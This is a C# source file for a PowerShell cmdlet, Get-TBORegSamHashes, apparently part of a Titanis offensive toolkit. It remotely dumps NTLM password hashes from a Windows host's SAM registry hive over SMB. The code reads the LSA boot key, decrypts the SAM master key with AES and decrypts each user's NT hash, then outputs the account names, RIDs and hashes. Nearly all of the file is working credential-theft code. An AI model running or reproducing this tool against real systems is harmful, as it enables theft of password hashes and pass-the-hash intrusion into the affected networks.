using System;
using System.Buffers.Binary;
using System.Collections.Generic;
using System.Collections.Immutable;
using System.Globalization;
using System.IO;
using System.Management.Automation;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Threading;
using Titanis;
using Titanis.Msrpc.Msrrp;
using Titanis.Msrpc.Msrrp.Cli;
using Titanis.Winterop;
using Titanis.Winterop.Sam;

namespace Titanis.Tbo.Smb2.PowerShell
{
	public sealed class TboRegSamHashInfo
	{
		public string ServerName { get; init; } = string.Empty;
		public string? AccountName { get; init; }
		public string? FullName { get; init; }
		public uint Rid { get; init; }
		public byte[]? NtlmHash { get; init; }
		public string? NtlmHashText { get; init; }
	}

	[Cmdlet(VerbsCommon.Get, "TBORegSamHashes")]
	[OutputType(typeof(TboRegSamHashInfo))]
	public sealed class GetTBORegSamHashes : TboRegCmdlet
	{
		private const string SamAccountPath = @"SAM\SAM\Domains\Account";
		private const string SamUsersPath = @"SAM\SAM\Domains\Account\Users";
		private const RegistryKeyOptions SamKeyOptions = RegistryKeyOptions.BackupRestore;
		private const int SamUserAttrCount = 17;
		private const int SamUserAttrInfoSize = 12;

		protected override void ProcessRecord(ISmbProviderInfo smb, CancellationToken cancellationToken)
		{
			ExecuteRegistryOperation(smb, cancellationToken, session =>
			{
				byte[]? syskey = null;
				SamStore? store = null;
				Dictionary<uint, string> nameLookup = new();
				IRegistryKey? localMachineKey = null;
				try
				{
					LogDiagnostic(smb, $"Get-TBORegSamHashes: opening HKLM root on {this.ServerName}.");
					localMachineKey = session.Client.OpenRootKey(
						RegistryRootKey.LocalMachine,
						RegistryAccessRights.EnumerateSubkeys | RegistryAccessRights.QueryValue,
						cancellationToken).GetAwaiter().GetResult();

					LogDiagnostic(smb, $"Get-TBORegSamHashes: HKLM opened on {this.ServerName}.");
					syskey = ExtractSyskey(smb, localMachineKey, cancellationToken);
					LogDiagnostic(smb, $"Get-TBORegSamHashes: syskey extracted on {this.ServerName}.");
					store = ExtractSamStore(smb, localMachineKey, syskey, cancellationToken);
					LogDiagnostic(smb, $"Get-TBORegSamHashes: SAM store {(store?.HasMasterKey == true ? "has" : "missing")} master key on {this.ServerName}.");
					nameLookup = TryReadSamUserNames(smb, localMachineKey, cancellationToken);
				}
				catch (Exception ex) when (IsRetryableInitException(ex))
				{
					throw;
				}
				catch (Exception ex)
				{
					smb.LogException($"Get-TBORegSamHashes failed to initialize for {this.ServerName}", ex);
					this.WriteWarning($"Get-TBORegSamHashes failed to initialize: {ex.Message}");
				}

				if (store == null || !store.HasMasterKey)
				{
					localMachineKey?.Dispose();
					return;
				}

				try
				{
					List<RegistrySubkeyInfo> users;
					List<(string KeyName, uint Rid, string? Name)> userEntries = new();
					if (nameLookup.Count > 0)
					{
						LogDiagnostic(smb, $"Get-TBORegSamHashes: using SAM Names map ({nameLookup.Count} entries) to resolve user RIDs.");
						foreach (var entry in nameLookup)
						{
							var rid = entry.Key;
							var keyName = rid.ToString("X8");
							userEntries.Add((keyName, rid, entry.Value));
						}
					}
					else
					{
						LogDiagnostic(smb, $"Get-TBORegSamHashes: opening SAM Users key on {this.ServerName}.");
						using var usersKey = localMachineKey!.OpenSubkey(
							SamUsersPath,
							RegistryAccessRights.EnumerateSubkeys,
							SamKeyOptions,
							cancellationToken).GetAwaiter().GetResult();
						try
						{
							users = CollectSubkeys(usersKey, cancellationToken);
							LogDiagnostic(smb, $"Get-TBORegSamHashes: enumerated {users.Count} SAM user subkeys on {this.ServerName}.");
						}
						catch (Exception ex)
						{
							smb.LogException("Get-TBORegSamHashes failed to enumerate SAM users", ex);
							this.WriteWarning($"Get-TBORegSamHashes failed to enumerate SAM users: {ex.Message}");
							return;
						}

						foreach (var userKeyInfo in users)
						{
							var keyName = userKeyInfo.KeyName;
							if (string.Equals(keyName, "Names", StringComparison.OrdinalIgnoreCase))
								continue;

							if (!uint.TryParse(keyName, NumberStyles.HexNumber, CultureInfo.InvariantCulture, out var rid))
								continue;

							userEntries.Add((keyName, rid, null));
						}
					}

					foreach (var entry in userEntries)
					{
						var keyName = entry.KeyName;
						var rid = entry.Rid;
						try
						{
							LogDiagnostic(smb, $"Get-TBORegSamHashes: reading SAM user {keyName} on {this.ServerName}.");
							using var userKey = localMachineKey!.OpenSubkey(
								CombineSubkeyPath(SamUsersPath, keyName),
								RegistryAccessRights.QueryValue,
								RegistryKeyOptions.BackupRestore,
								cancellationToken).GetAwaiter().GetResult();
							var valueInfo = userKey.GetValue("V", cancellationToken).GetAwaiter().GetResult();
							var bytes = ExtractValueBytes(valueInfo);
							LogDiagnostic(smb, $"Get-TBORegSamHashes: SAM user {keyName} value size {(bytes?.Length ?? 0)} bytes on {this.ServerName}.");
							if (bytes == null || bytes.Length == 0)
							{
								this.WriteWarning($"Get-TBORegSamHashes failed to read SAM user {keyName}: value is empty.");
								continue;
							}

							if (!TryValidateSamUserRecord(bytes, out var reason))
							{
								this.WriteWarning($"Get-TBORegSamHashes skipped SAM user {keyName}: {reason ?? "record is invalid"}.");
								continue;
							}

							var user = new SamUserRegistryObject(store, rid, ImmutableArray<byte>.Empty, ImmutableArray.Create(bytes));
							var ntHash = user.GetDecryptedNtHash();
							var accountName = user.AccountName;
							if (string.IsNullOrWhiteSpace(accountName) && !string.IsNullOrWhiteSpace(entry.Name))
								accountName = entry.Name;
							if (string.IsNullOrWhiteSpace(accountName) && nameLookup.TryGetValue(rid, out var mappedName))
								accountName = mappedName;

							this.WriteObject(new TboRegSamHashInfo
							{
								ServerName = this.ServerName,
								AccountName = accountName,
								FullName = user.FullName,
								Rid = rid,
								NtlmHash = ntHash,
								NtlmHashText = ntHash?.ToHexString()
							});
						}
						catch (Exception ex)
						{
							smb.LogException($"Get-TBORegSamHashes failed to read SAM user {keyName}", ex);
							this.WriteWarning($"Get-TBORegSamHashes failed to read SAM user {keyName}: {ex.Message}");
						}
					}
				}
				finally
				{
					localMachineKey?.Dispose();
				}
			});
		}

		private byte[] ExtractSyskey(ISmbProviderInfo smb, IRegistryKey localMachineKey, CancellationToken cancellationToken)
		{
			LogDiagnostic(smb, $"Get-TBORegSamHashes: opening LSA key {RegistryBootKeyReader.LsaKeyPath}.");
			using var lsaKey = localMachineKey.OpenSubkey(
				RegistryBootKeyReader.LsaKeyPath,
				RegistryAccessRights.QueryValue,
				SamKeyOptions,
				cancellationToken).GetAwaiter().GetResult();
			LogDiagnostic(smb, $"Get-TBORegSamHashes: LSA key opened for {RegistryBootKeyReader.LsaKeyPath}.");

			return RegistryBootKeyReader.ExtractBootKey(lsaKey, lsaKey.KeyPath, cancellationToken, msg => LogDiagnostic(smb, msg));
		}

		private SamStore? ExtractSamStore(
			ISmbProviderInfo smb,
			IRegistryKey localMachineKey,
			byte[] syskey,
			CancellationToken cancellationToken)
		{
			LogDiagnostic(smb, $"Get-TBORegSamHashes: opening SAM account key {SamAccountPath}.");
			using var accountKey = localMachineKey.OpenSubkey(
				SamAccountPath,
				RegistryAccessRights.QueryValue,
				SamKeyOptions,
				cancellationToken).GetAwaiter().GetResult();
			var usersF = accountKey.GetValue("F", cancellationToken).GetAwaiter().GetResult();
			var fBytes = ExtractValueBytes(usersF);
			LogDiagnostic(smb, $"Get-TBORegSamHashes: SAM account F value size {(fBytes?.Length ?? 0)} bytes.");
			if (fBytes == null || fBytes.Length < 136)
			{
				this.WriteWarning("Get-TBORegSamHashes failed to read SAM account data: value is too short.");
				return null;
			}

			uint rev = BinaryPrimitives.ReadUInt32LittleEndian(fBytes.AsSpan(104, 4));
			if (rev != 2)
			{
				this.WriteWarning($"Get-TBORegSamHashes failed to read SAM account data: unsupported revision {rev}.");
				return null;
			}

			int cbData = BinaryPrimitives.ReadInt32LittleEndian(fBytes.AsSpan(116, 4));
			if (cbData <= 0 || 136 + cbData > fBytes.Length)
			{
				this.WriteWarning("Get-TBORegSamHashes failed to read SAM account data: encrypted payload is invalid.");
				return null;
			}

			byte[] salt = fBytes.AsSpan(120, 16).ToArray();
			byte[] data = fBytes.AsSpan(136, cbData).ToArray();

			try
			{
				using var aes = Aes.Create();
				aes.Key = syskey;
				var decryptedMasterKey = aes.DecryptCbc(data, salt);
				return new SamStore(decryptedMasterKey);
			}
			catch (Exception ex)
			{
				smb.LogException("Get-TBORegSamHashes failed to decrypt SAM account data", ex);
				this.WriteWarning($"Get-TBORegSamHashes failed to decrypt SAM account data: {ex.Message}");
			}

			return null;
		}

		private Dictionary<uint, string> TryReadSamUserNames(
			ISmbProviderInfo smb,
			IRegistryKey localMachineKey,
			CancellationToken cancellationToken)
		{
			var results = new Dictionary<uint, string>();

			try
			{
				LogDiagnostic(smb, $"Get-TBORegSamHashes: opening SAM user Names key {SamUsersPath}\\Names.");
				using var namesKey = localMachineKey.OpenSubkey(
					CombineSubkeyPath(SamUsersPath, "Names"),
					RegistryAccessRights.EnumerateSubkeys | RegistryAccessRights.QueryValue,
					SamKeyOptions,
					cancellationToken).GetAwaiter().GetResult();

				var subkeys = CollectSubkeys(namesKey, cancellationToken);
				LogDiagnostic(smb, $"Get-TBORegSamHashes: enumerated {subkeys.Count} SAM name entries.");
				foreach (var subkeyInfo in subkeys)
				{
					var name = subkeyInfo.KeyName;
					if (string.IsNullOrWhiteSpace(name))
						continue;

					try
					{
						LogDiagnostic(smb, $"Get-TBORegSamHashes: reading SAM name entry {name}.");
						using var userKey = namesKey.OpenSubkey(name, RegistryAccessRights.QueryValue, RegistryKeyOptions.BackupRestore, cancellationToken).GetAwaiter().GetResult();
						var valueInfo = userKey.GetValue(null, cancellationToken).GetAwaiter().GetResult();
						uint rid;
						if (!TryReadRid(valueInfo, out rid))
						{
							valueInfo = userKey.GetValue(string.Empty, cancellationToken).GetAwaiter().GetResult();
						}
						if (TryReadRid(valueInfo, out rid))
							results[rid] = name;
					}
					catch (Exception ex)
					{
						smb.LogException($"Get-TBORegSamHashes failed to read SAM name entry {name}", ex);
					}
				}
			}
			catch (Exception ex)
			{
				smb.LogException("Get-TBORegSamHashes failed to read SAM user name map", ex);
			}

			return results;
		}

		private static byte[]? ExtractValueBytes(RegistryValueInfo info)
		{
			if (info.Bytes != null && info.Bytes.Length > 0)
				return info.Bytes;
			if (info.TypedValue is byte[] typedBytes && typedBytes.Length > 0)
				return typedBytes;
			return null;
		}

		private static void LogDiagnostic(ISmbProviderInfo smb, string message)
		{
			if (smb is SmbProviderInfo provider)
			{
				provider.LogDiagnostic(message);
			}
		}

		private static bool TryReadRid(RegistryValueInfo info, out uint rid)
		{
			rid = 0;
			if (info.TypedValue is uint typedUint)
			{
				rid = typedUint;
				return true;
			}

			if (info.TypedValue is int typedInt && typedInt >= 0)
			{
				rid = (uint)typedInt;
				return true;
			}

			var bytes = ExtractValueBytes(info);
			if (bytes == null || bytes.Length < 4)
				return false;

			rid = BinaryPrimitives.ReadUInt32LittleEndian(bytes.AsSpan(0, 4));
			return true;
		}

		private static string? CombineSubkeyPath(string? basePath, string childName)
		{
			if (string.IsNullOrEmpty(basePath))
				return childName;
			if (string.IsNullOrEmpty(childName))
				return basePath;
			return $"{basePath}\\{childName}";
		}

		private static bool IsRetryableInitException(Exception ex)
		{
			if (ex is NtstatusException nt && nt.StatusCode == Ntstatus.STATUS_PIPE_BUSY)
				return true;
			if (ex is AggregateException aggregate)
			{
				foreach (var inner in aggregate.InnerExceptions)
				{
					if (IsRetryableInitException(inner))
						return true;
				}
			}
			if (ex is IOException or SocketException)
				return true;
			return ex.InnerException != null && IsRetryableInitException(ex.InnerException);
		}

		private static bool TryValidateSamUserRecord(byte[] bytes, out string? reason)
		{
			reason = null;
			int attrTableSize = SamUserAttrCount * SamUserAttrInfoSize;
			if (bytes.Length < attrTableSize)
			{
				reason = "value is too short for the attribute table";
				return false;
			}

			for (int i = 0; i < SamUserAttrCount; i++)
			{
				int offset = BinaryPrimitives.ReadInt32LittleEndian(bytes.AsSpan(i * SamUserAttrInfoSize, 4));
				int length = BinaryPrimitives.ReadInt32LittleEndian(bytes.AsSpan(i * SamUserAttrInfoSize + 4, 4));

				if (offset < 0 || length < 0)
				{
					reason = $"attribute {i} has a negative offset or length";
					return false;
				}

				if (offset == 0 && length == 0)
					continue;

				long end = (long)attrTableSize + offset + length;
				if (end > bytes.Length)
				{
					reason = $"attribute {i} is out of range";
					return false;
				}
			}

			return true;
		}
	}
}
